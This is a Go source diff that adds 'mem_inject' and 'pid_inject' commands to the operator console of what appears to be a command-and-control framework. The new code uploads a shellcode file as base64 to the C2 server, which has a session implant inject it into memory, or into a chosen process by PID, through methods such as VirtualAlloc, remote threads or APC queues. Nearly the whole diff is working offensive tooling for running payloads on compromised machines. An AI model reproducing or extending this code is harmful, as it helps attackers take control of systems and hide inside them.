@@ -432,4 +432,102 @@ func InitializeSessionCLI(sessionApp *grumble.App, activeSession int) {
 
 	sessionApp.AddCommand(sessionUpdateIntervalCmd)
 
+	sessionMemInject := &grumble.Command{
+		Name:     "mem_inject",
+		Help:     "delivers a shellcode payload to be injected into memory",
+		LongHelp: "delivers a shellcode payload to be injected into memory via implant defined process such as HeapAlloc or VirtualAlloc",
+		Args: func(a *grumble.Args) {
+			a.String("shellcode", "path to the file containing the shellcode string (shellcode format: aabbccddeeff)")
+		},
+		Flags: func(f *grumble.Flags) {
+			f.String("m", "method", "any", "memory injection method default is 'any' but any other custom text can be supplied here as long as the implant understands it")
+		},
+		Run: func(c *grumble.Context) error {
+
+			uploadFile := c.Args.String("shellcode")
+
+			method := c.Flags.String("method")
+
+			fileName := uploadFile
+
+			fileb64 := core.UploadFile(uploadFile)
+
+			if fileb64 != "" {
+
+				// Exec on server and get session functions
+
+				reqString := "&isSessionShell=true&activeSession=" + strconv.Itoa(ActiveSession) + "&command=mem_inject"
+				commandString := "&filename=" + url.QueryEscape(method) + "&file=" + url.QueryEscape(fileb64)
+
+				reqString = core.AuthURL + reqString + commandString
+
+				resp, err := core.WolfPackHTTP.Get(reqString)
+
+				if err != nil {
+					fmt.Println(err)
+					return nil
+				}
+
+				defer resp.Body.Close()
+
+				core.SuccessColorBold.Println("Shellcode: " + fileName + " should now be injected!")
+
+			}
+
+			return nil
+		},
+	}
+
+	sessionApp.AddCommand(sessionMemInject)
+
+	sessionPidInject := &grumble.Command{
+		Name:     "pid_inject",
+		Help:     "delivers a shellcode payload to a injected into a specific process memory",
+		LongHelp: "delivers a shellcode payload to a injected into a specific process memory via methods such as RemoteThread and APC Queues",
+		Args: func(a *grumble.Args) {
+			a.String("shellcode", "path to the file containing the shellcode string (shellcode format: aabbccddeeff)")
+		},
+		Flags: func(f *grumble.Flags) {
+			f.Int("p", "pid", 0, "process identifier to inject, default is '0' for a random PID")
+		},
+		Run: func(c *grumble.Context) error {
+
+			uploadFile := c.Args.String("shellcode")
+
+			pid := c.Flags.Int("pid")
+
+			pidString := strconv.Itoa(pid)
+
+			fileName := uploadFile
+
+			fileb64 := core.UploadFile(uploadFile)
+
+			if fileb64 != "" {
+
+				// Exec on server and get session functions
+
+				reqString := "&isSessionShell=true&activeSession=" + strconv.Itoa(ActiveSession) + "&command=pid_inject"
+				commandString := "&filename=" + url.QueryEscape(pidString) + "&file=" + url.QueryEscape(fileb64)
+
+				reqString = core.AuthURL + reqString + commandString
+
+				resp, err := core.WolfPackHTTP.Get(reqString)
+
+				if err != nil {
+					fmt.Println(err)
+					return nil
+				}
+
+				defer resp.Body.Close()
+
+				core.SuccessColorBold.Println("Shellcode: " + fileName + " should now be injected into PID: " + pidString + "!")
+
+			}
+
+			return nil
+		},
+	}
+
+	sessionApp.AddCommand(sessionPidInject)
+
 }
